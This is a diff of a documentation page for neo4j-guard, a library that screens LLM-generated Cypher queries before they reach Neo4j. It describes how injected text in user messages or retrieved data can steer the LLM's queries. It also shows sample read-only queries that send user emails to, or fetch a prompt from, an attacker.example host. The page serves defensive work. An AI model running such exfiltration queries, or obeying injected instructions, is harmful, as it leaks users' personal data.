@@ -1,16 +1,12 @@
 ---
 title: Why neo4j-guard?
-description: neo4j-guard is a guardrail for LLM-generated Cypher that blocks what read-only connections still allow, such as LOAD CSV and APOC procedures. Compatible with Neo4j Community Edition, Enterprise Edition and Aura.
+description: neo4j-guard is designed as an agent guardrail. It blocks unsafe queries that read-only connections still allow, such as LOAD CSV and APOC procedures. Compatible with Neo4j Community Edition, Enterprise Edition and Aura.
 sidebar_position: 2
 ---
 
-## LLM-written Cypher is untrusted input
+`neo4j-guard` is designed as an agent guardrail. LLM-generated Cypher is untrusted input. An LLM writes Cypher from the text it is given: user messages, retrieved documents and data from the graph itself. Any of that text can carry instructions, so anyone who can put text in front of the LLM can change the query it writes. The query then runs with the permissions of the database connection.
 
-An LLM writes Cypher from the text it is given: user messages, retrieved documents and data from the graph itself. Any of that text can carry instructions, so anyone who can put text in front of the LLM can change the query it writes. The query then runs with the permissions of the database connection.
-
-## Read-only does not stop malicious queries
-
-The usual defense is to make the connection read-only. Enterprise Edition and Aura support read-only database users, but Community Edition does not, which leaves the MCP server's `read_only` option. Either way, read-only only blocks writes, but a query does not need to write to do damage. Each of these queries only reads:
+Read-only does not stop malicious queries. The usual defense is to make the connection read-only, but this is not available to Community Edition users. Either way, read-only only blocks writes, but a query does not need to write to do damage. Each of these malicious queries can run with read-only permissions:
 
 ```cypher
 // Reads a property the LLM should not see
@@ -23,11 +19,7 @@ MATCH (u:User) LOAD CSV FROM 'https://attacker.example/?email=' + u.email AS row
 CALL apoc.load.json('https://attacker.example/prompt.json') YIELD value RETURN value
 ```
 
-## neo4j-guard checks every query before it runs
-
-`neo4j-guard` checks every query against an allowlist before Neo4j sees it, instead of only asking whether it writes. Read mode allows read clauses, built-in functions, and schema and search procedures, and blocks everything else, including `LOAD CSV` and APOC. Labels and properties in `disallow`, such as `Person.ssn`, are blocked in queries and in returned records.
-
-It takes one call on the driver, with no server changes, and it works on Community Edition, Enterprise Edition and Aura:
+Therefore, it is important to check every query before it runs. `neo4j-guard` fully parses each query into a syntax tree with Neo4j's own Cypher 25 grammar and checks every query against an allowlist before Neo4j sees it. It takes one call on the driver, with no server changes, and it works on Community Edition, Enterprise Edition and Aura:
 
 ```python
 from neo4j import GraphDatabase
@@ -35,7 +27,7 @@ from neo4j_guard import guard
 
 driver = guard(
     GraphDatabase.driver(URL, auth=AUTH),
-    mode="read",
+    mode="read", # default configuration blocks most malicious queries
     disallow=["Person.ssn"],
 )
 ```
